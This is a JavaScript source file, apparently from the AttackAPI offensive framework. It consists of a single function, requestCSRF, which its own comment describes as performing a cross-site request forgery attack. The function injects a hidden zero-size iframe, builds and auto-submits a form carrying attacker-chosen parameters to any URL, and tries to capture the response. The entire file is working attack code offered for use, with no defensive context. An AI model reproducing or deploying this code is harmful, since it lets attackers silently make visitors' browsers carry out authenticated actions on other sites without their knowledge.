
/**
 * @cat DOM
 * @name AttackAPI.dom.requestCSRF
 * @desc perform Cross-site request forgery attack
 */
AttackAPI.requestCSRF = function (request) {
	var tmr = null;
	
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	
	document.body.appendChild(ifr);
	
	var doc = this.getDocument(ifr);
	
	var form = document.createElement('form');
	form.setAttribute('method', request.method?request.method:'GET');
	form.setAttribute('action', request.url);
	
	for (var name in request.query) {
		var input = document.createElement('input');
		input.setAttribute('name', name);
		input.setAttribute('value', request.query[name]);
		input.setAttribute('type', 'text');
		
		form.appendChild(input);
	}
	
	doc.body.appendChild(form);

	ifr.onload = function () {
		window.clearTimeout(tmr);
		
		var data = null;
		
		try {
			data = this.getDocument(ifr).body.innerHTML;
		} catch (e) {}
		
		ifr.src = '';
		document.body.removeChild(ifr);
		
		if (typeof(request.onload) == 'function')
			request.onload({data: data}, request);
	};
	
	tmr = window.setTimeout(function () {
		document.body.removeChild(ifr);
		
		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:10000);
	
	form.submit();
};
